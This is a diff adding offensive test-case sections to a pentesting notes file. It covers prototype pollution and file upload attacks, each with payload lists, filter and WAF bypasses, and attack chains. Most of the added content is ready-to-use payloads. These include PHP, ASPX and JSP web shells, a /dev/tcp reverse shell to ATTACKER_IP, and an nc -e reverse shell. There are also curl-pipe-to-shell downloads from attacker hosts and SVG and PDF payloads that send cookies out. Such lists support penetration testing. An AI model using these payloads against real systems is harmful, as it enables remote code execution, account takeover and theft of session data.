@@ -8238,6 +8238,227 @@ Classic XXE - etc passwd
 
 Here’s a curated list of **fuzzable parameters** and input sinks commonly involved in **Prototype Pollution**, tailored for pentesting workflows like yours:
 
+# **✅ Prototype Pollution Attack – Complete Test Case (with Bypass Cases)**
+
+# **1. List of Vulnerabilities**
+
+1.1 Object Prototype Pollution
+
+1.2 Constructor Prototype Pollution
+
+1.3 Polluting Deep Nested Objects
+
+1.4 DOM Prototype Pollution (Client-Side)
+
+1.5 Server-Side Prototype Pollution (Node.js)
+
+1.6 Bypass Shallow Key Filters
+
+1.7 Polluting JSON Merge / Patch Endpoint
+
+1.8 Pollution via Query Parameters
+
+1.9 Escaping Input Sanitization
+
+1.10 Advanced Payload Chains (Privilege Escalation / RCE)
+
+# **2. Sample Payloads (Core Attack Payloads)**
+
+*(Normal Structured Payloads)*
+
+```
+2.1 Basic Prototype Pollution
+{"__proto__":{"polluted":true}}
+```
+
+```
+2.2 Constructor Prototype Pollution
+{"constructor":{"prototype":{"admin":true}}}
+```
+
+```
+2.3 Deep Nested Pollution
+{"a":{"b":{"__proto__":{"isAdmin":1}}}}
+```
+
+```
+2.4 Pollute Global Object.prototype
+{"prototype":{"debug":"enabled"}}
+```
+
+```
+2.5 Function Constructor Pollution
+{"constructor":{"prototype":{"exploit":"yes"}}}
+```
+
+```
+2.6 Array Prototype Pollution
+{"__proto__":{"0":"malicious","length":9999}}
+```
+
+```
+2.7 Query Parameter Pollution
+?__proto__[admin]=true
+```
+
+```
+2.8 JSON Patch Pollution
+{"op":"add","path":"/__proto__/pwn","value":"x"}
+```
+
+```
+2.9 Express.js Body Parser Pollution
+?a[__proto__][admin]=1
+```
+
+```
+2.10 Server Config Pollution
+{"__proto__":{"cacheTTL":0}}
+```
+
+---
+
+# **3. Sample Payloads (Updated With Real Offensive Payloads)**
+
+*(Offensive prototype pollution payloads used for real attack chains)*
+
+```
+3.1 Node.js Command Execution Chain
+{"__proto__":{"shell":"/bin/bash -c 'curl http://x/p.sh|sh'"}}
+```
+
+```
+3.2 Privilege Escalation (User → Admin)
+{"constructor":{"prototype":{"role":"admin"}}}
+```
+
+```
+3.3 JWT Auth Bypass
+{"__proto__":{"algorithms":["none"],"ignoreExpiration":true}}
+```
+
+```
+3.4 Rate Limit Bypass
+{"__proto__":{"rateLimit":0}}
+```
+
+```
+3.5 DOM XSS via innerHTML Pollution
+{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}
+```
+
+```
+3.6 Pollute Object.assign() Defaults
+{"__proto__":{"overwrite":true}}
+```
+
+```
+3.7 Path Traversal → File Write Exploit
+{"__proto__":{"recursive":true}}
+```
+
+```
+3.8 Disable Security Sanitizers
+{"__proto__":{"sanitizeFilter":false}}
+```
+
+```
+3.9 Password Policy Bypass
+{"__proto__":{"minPasswordLength":1}}
+```
+
+```
+3.10 CSRF Protection Disable
+{"__proto__":{"csrfEnabled":false}}
+```
+
+---
+
+# **4. Bypass Techniques (Filters, Sanitizers, WAF Evasion)**
+
+*(Same style as Host Header / GraphQL bypass cases)*
+
+```
+4.1 Unicode Bypass
+{"\u005f\u005fproto\u005f\u005f":{"admin":1}}
+```
+
+```
+4.2 Double-Encoded Key Bypass
+%5F%5Fproto%5F%5F[admin]=1
+```
+
+```
+4.3 Mixed Case Bypass
+{"__ProTo__":{"polluted":"yes"}}
+```
+
+```
+4.4 Deep Nesting to Evade Shallow Filters
+{"x":{"y":{"z":{"__proto__":{"pwn":"x"}}}}}
+```
+
+```
+4.5 Array Injection Bypass
+[{"__proto__":{"admin":true}}]
+```
+
+```
+4.6 Dot-Notation Bypass
+?__proto__.role=admin
+```
+
+```
+4.7 Bracket-Notation Bypass
+?__proto__[role]=admin
+```
+
+```
+4.8 Encoded JSON Patch Bypass
+{"op":"add","path":"\/__proto__\/\u0061","value":"pwn"}
+```
+
+```
+4.9 Nested Constructor Override
+{"a":{"constructor":{"prototype":{"hacked":1}}}}
+```
+
+```
+4.10 Polluting via CSP-Bypass (Client-Side)
+?__proto__[nonce]=fakeNonce
+```
+
+---
+
+# **5. Advanced Attack Chains**
+
+*(Prototype Pollution → XSS / RCE / Auth Bypass)*
+
+```
+5.1 Prototype Pollution → DOM XSS
+?__proto__[innerHTML]=<img src=x onerror=alert(1337)>
+```
+
+```
+5.2 Prototype Pollution → JWT "None" Bypass
+{"__proto__":{"algorithms":["none"]}}
+```
+
+```
+5.3 Prototype Pollution → Node RCE
+{"__proto__":{"shell":"/bin/sh -c 'nc attacker 4444 -e /bin/sh'"}}
+```
+
+```
+5.4 Prototype Pollution → NoSQL Injection
+{"__proto__":{"sanitizeFilter":false}}
+```
+
+```
+5.5 Prototype Pollution → Full Account Takeover
+{"constructor":{"prototype":{"role":"superadmin"}}}
+```
+
 ---
 
 ## 🧪 Common Parameters to Fuzz for Prototype Pollution
@@ -11437,3 +11658,278 @@ X-Content-Type-Options: missing
 - ❌ Vulnerable: Browser may render as HTML
 
 ---
+# **1. List of Vulnerabilities**
+
+```
+1.1 Unrestricted File Upload
+1.2 MIME-Type Bypass
+1.3 Content-Type Header Forgery
+1.4 File Extension Bypass
+1.5 Double Extension Upload
+1.6 Null Byte Injection
+1.7 Polyglot File Upload (Image + Script)
+1.8 SVG XSS Payload Upload
+1.9 Uploading .htaccess for PHP Execution
+1.10 Upload Path Traversal (../)
+1.11 Client-Side Validation Bypass
+1.12 Server-Side Weak Validation
+1.13 ImageMagic / EXIF Injection (ImageTragick)
+1.14 Remote Code Execution via File Upload
+1.15 File Upload → SSRF / LFI / RCE Chains
+```
+
+---
+
+# **2. Sample Payloads (Core Attack Payloads)**
+
+*(Normal Structured Payload List)*
+
+```
+2.1 Simple Web Shell Upload
+<?php system($_GET['cmd']); ?>
+```
+
+```
+2.2 Double Extension File
+shell.php.jpg
+```
+
+```
+2.3 Fake MIME Type Header
+Content-Type: image/jpeg
+```
+
+```
+2.4 Null Byte Injection (Legacy PHP)
+shell.php%00.jpg
+```
+
+```
+2.5 Polyglot Image + PHP
+GIF89a;
+<?php echo shell_exec($_GET['cmd']); ?>
+```
+
+```
+2.6 Malicious SVG Upload (XSS)
+<svg><script>alert(1)</script></svg>
+```
+
+```
+2.7 .htaccess to Force PHP Execution
+AddType application/x-httpd-php .jpg
+```
+
+```
+2.8 Upload Path Traversal
+../../../../tmp/shell.php
+```
+
+```
+2.9 Malicious EXIF Injection
+exiftool -Comment="<?php system($_GET['cmd']); ?>" image.jpg
+```
+
+```
+2.10 ImageMagick Exploit (ImageTragick)
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://attacker.com/payload")'
+```
+
+---
+
+# **3. Sample Payloads (Updated With Real Offensive Payloads)**
+
+*(Real-world exploitation payloads used in RCE cases)*
+
+```
+3.1 PHP One-Liner Shell
+<?=`$_GET[0]`?>
+```
+
+```
+3.2 ASPX Web Shell
+<%@ Page Language="C#" %><% Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"])); %>
+```
+
+```
+3.3 JSP Reverse Shell
+<%@ page import="java.io.*"%><%Runtime.getRuntime().exec("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");%>
+```
+
+```
+3.4 WAR Upload (Tomcat)
+[WAR archive containing malicious JSP]
+```
+
+```
+3.5 PHP File Hidden in JPEG (Polyglot)
+ÿØÿà<?php echo shell_exec($_GET['cmd']); ?>
+```
+
+```
+3.6 SVG with External Entity (SVG XXE)
+<!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg>&x;</svg>
+```
+
+```
+3.7 Malicious PDF Payload (JS Auto-Exec)
+<< /OpenAction << /JS (app.alert('Pwned')) >> >>
+```
+
+```
+3.8 Windows Executable Upload (Phishing Dropper)
+payload.exe
+```
+
+```
+3.9 Node.js RCE via Uploaded .js Script
+require('child_process').exec('curl http://attacker/a.sh | sh')
+```
+
+```
+3.10 Python Script Upload → Cronjob Hijack
+os.system("curl attacker/pwn | bash")
+```
+
+---
+
+# **4. Bypass Techniques (Filters, WAF, Antivirus, MIME Checks)**
+
+*(Same style as Host Header / Prototype Pollution bypass sections)*
+
+```
+4.1 Double Extension Bypass
+pwn.php.gif
+```
+
+```
+4.2 Triple Extension Bypass
+pwn.php.jpg.png
+```
+
+```
+4.3 Full Null Byte Injection
+pwn.php%00.png
+```
+
+```
+4.4 Upper/Lower Case Extension Bypass
+SHELL.PhP
+```
+
+```
+4.5 UTF-8 Normalization Bypass
+pwn.p%CC%88hp
+```
+
+```
+4.6 Spoof Content-Type
+Content-Type: image/png
+```
+
+```
+4.7 Chunked Transfer-Encoding Bypass
+Transfer-Encoding: chunked
+```
+
+```
+4.8 Polyglot (PDF + JS + Image)
+%PDF-1.3
+<js_code_here>
+```
+
+```
+4.9 Magic Bytes Bypass (Fake Header)
+FF D8 FF E0 (JPEG) + <?php ... ?>
+```
+
+```
+4.10 SVG as Image / Script Combo
+<svg/onload=alert(1)>
+```
+
+```
+4.11 Base64 Encoded Upload
+data:image/png;base64,PD9waHAgc3lzdGVtKCRfR0VUWydj...
+```
+
+```
+4.12 GZIP Compressed Upload
+(file.gz containing PHP)
+```
+
+```
+4.13 HTAccess MIME Force Execution
+AddHandler application/x-httpd-php .jpg
+```
+
+```
+4.14 File Name Obfuscation
+....////shell.php
+```
+
+```
+4.15 Multi-part Boundary Manipulation
+------AaB03x
+Content-Disposition: form-data; filename="pwn.php"
+```
+
+```
+4.16 Oversized Boundary (WAF Bypass)
+------verylongboundarystring123...
+```
+
+```
+4.17 Browser-based Client Validation Bypass
+Disable JS, upload shell.php
+```
+
+```
+4.18 Parameter Pollution
+file=shell.php&file=.jpg
+```
+
+---
+
+# **5. Advanced Attack Chains (Upload → Full Compromise)**
+
+```
+5.1 File Upload → Web Shell → RCE
+Upload: shell.php
+Execute: /uploads/shell.php?cmd=id
+```
+
+```
+5.2 SVG Upload → Stored XSS → Session Hijack
+<svg><script>document.location='//attacker/cookie?c='+document.cookie</script></svg>
+```
+
+```
+5.3 PDF Upload → JS Execution → Credential Theft
+/OpenAction << /JS (fetch('https://x/pwn?c='+document.cookie)) >>
+```
+
+```
+5.4 File Upload → SSRF via Image Parsing
+push graphic-context
+fill 'url(http://127.0.0.1:8080/admin)'
+```
+
+```
+5.5 File Upload → Path Traversal → Config Overwrite
+filename="../../../../config.php"
+```
+
+```
+5.6 File Upload → Zip Slip → RCE
+evil.zip
+ ├── ../../../../var/www/html/shell.php
+```
+
+```
+5.7 Upload Malware → AV Bypass → Persistence
+payload.exe masked as invoice.png
+```
+
